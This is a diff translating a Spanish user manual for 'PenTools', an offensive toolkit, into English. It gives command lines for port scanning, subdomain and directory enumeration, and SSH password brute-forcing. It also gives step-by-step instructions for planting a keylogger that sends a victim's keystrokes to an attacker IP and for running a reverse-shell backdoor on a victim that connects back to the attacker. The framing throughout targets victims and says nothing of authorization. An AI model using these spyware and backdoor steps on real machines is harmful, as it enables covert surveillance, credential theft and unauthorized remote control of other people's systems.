@@ -1,53 +1,53 @@
-# 📘 Manual de Uso: PenTools
+# 📘 User Manual: PenTools
 
-Este documento explica cómo utilizar paso a paso cada una de las herramientas de tu suite de ciberseguridad **PenTools**.
+This document explains step-by-step how to use each of the tools in your **PenTools** cybersecurity suite.
 
-## 1. Escáner de Puertos (Port Scanner) 🕵️‍♂️
-Descubre qué servicios están abiertos en una máquina.
-- **Básico:** `python network/port_scanner.py 192.168.1.1`
-- **Rango específico:** `python network/port_scanner.py 192.168.1.1 -p 1-100`
-- **Más velocidad:** `python network/port_scanner.py 192.168.1.1 -t 200`
+## 1. Port Scanner 🕵️‍♂️
+Discovers open services on a machine.
+- **Basic:** `python network/port_scanner.py 192.168.1.1`
+- **Specific Range:** `python network/port_scanner.py 192.168.1.1 -p 1-100`
+- **Higher Speed:** `python network/port_scanner.py 192.168.1.1 -t 200`
 
-## 2. Enumeración de Subdominios 🌐
-Encuentra subdominios ocultos de una web.
-- **Modo Web (VHOST):** Busca sitios virtuales ocultos.
+## 2. Subdomain Enumeration 🌐
+Finds hidden subdomains of a website.
+- **Web Mode (VHOST):** Searches for hidden virtual hosts.
   `python web/subdomain_enumeration.py 10.10.10.10 google.com`
-- **Modo DNS (Recomendado):** Pregunta a internet si el subdominio existe (más rápido).
+- **DNS Mode (Recommended):** Queries the internet to see if the subdomain exists (faster).
   `python web/subdomain_enumeration.py 8.8.8.8 google.com --dns`
 
-## 3. KeyLogger (Espía de Teclado) ⌨️
-Graba lo que escribe la víctima y te lo envía.
-1.  **En TU máquina (Atacante):** Inicia el servidor para recibir los datos.
+## 3. KeyLogger (Keyboard Spy) ⌨️
+Records what the victim types and sends it to you.
+1.  **On YOUR machine (Attacker):** Start the server to receive data.
     `python spyware/keylogger_server.py -p 8080`
-2.  **En la víctima:** Ejecuta el cliente (necesita permisos de admin).
-    `python spyware/keylogger.py --ip <TU_IP> --port 8080`
-    *(Cuando la víctima pulse ENTER, recibirás todo lo que escribió)*.
-    *Nota: Si antivirus lo detecta, es normal, es un comportamiento malicioso.*
+2.  **On the victim:** Run the client (needs admin permissions).
+    `python spyware/keylogger.py --ip <YOUR_IP> --port 8080`
+    *(When the victim presses ENTER, you will receive everything they typed)*.
+    *Note: If antivirus detects it, that is normal, as it is malicious behavior.*
 
-## 4. SSH Brute Force (Rompe Claves) 🔓
-Intenta adivinar la contraseña de un servidor SSH.
-`python network/ssh_bruteforce.py 192.168.1.50 usuario resources/wordlists/diccionario.txt -t 10`
+## 4. SSH Brute Force (Password Cracker) 🔓
+Attempts to guess the password of an SSH server.
+`python network/ssh_bruteforce.py 192.168.1.50 user resources/wordlists/dictionary.txt -t 10`
 
-## 5. Buscador de Archivos JS (JS Crawler) 🕸️
-Descarga todos los archivos JavaScript de una web para analizarlos en busca de fallos.
-`python web/js_crawler.py http://ejemplo.com -o scripts_descargados`
+## 5. JS File Crawler 🕸️
+Downloads all JavaScript files from a website to analyze them for vulnerabilities.
+`python web/js_crawler.py http://example.com -o downloaded_scripts`
 
-## 6. Enumeración de Directorios 📂
-Busca carpetas ocultas en una web (ej: /admin, /backup).
-`python web/directory_enumeration.py 192.168.1.1 -w resources/wordlists/comun.txt`
+## 6. Directory Enumeration 📂
+Searches for hidden folders on a website (e.g., /admin, /backup).
+`python web/directory_enumeration.py 192.168.1.1 -w resources/wordlists/common.txt`
 
-## 7. Backdoors (Acceso Remoto) 🚪
-Herramientas para mantener acceso a una máquina controlada de forma remota.
+## 7. Backdoors (Remote Access) 🚪
+Tools to maintain remote access to a controlled machine.
 
 ### Reverse Shell
-Establece una conexión inversa desde la víctima hacia el atacante.
+Establishes a reverse connection from the victim back to the attacker.
 
-1.  **En TU máquina (Atacante):** Pon el servidor a la escucha.
+1.  **On YOUR machine (Attacker):** Set up the listener.
     `python backdoors/listener.py -p 4444`
-2.  **En la víctima:** Ejecuta el payload para conectar de vuelta.
-    `python backdoors/reverse_shell.py --ip <TU_IP> --port 4444`
+2.  **On the victim:** Run the payload to connect back.
+    `python backdoors/reverse_shell.py --ip <YOUR_IP> --port 4444`
 
 ---
 ---
-> **Nota:**
-> Se han eliminado los ejecutables precompilados. Para usar las herramientas, asegúrate de tener Python instalado y ejecutar los scripts directamente como se muestra arriba.
+> **Note:**
+> Pre-compiled executables have been removed. To use the tools, ensure you have Python installed and run the scripts directly as shown above.
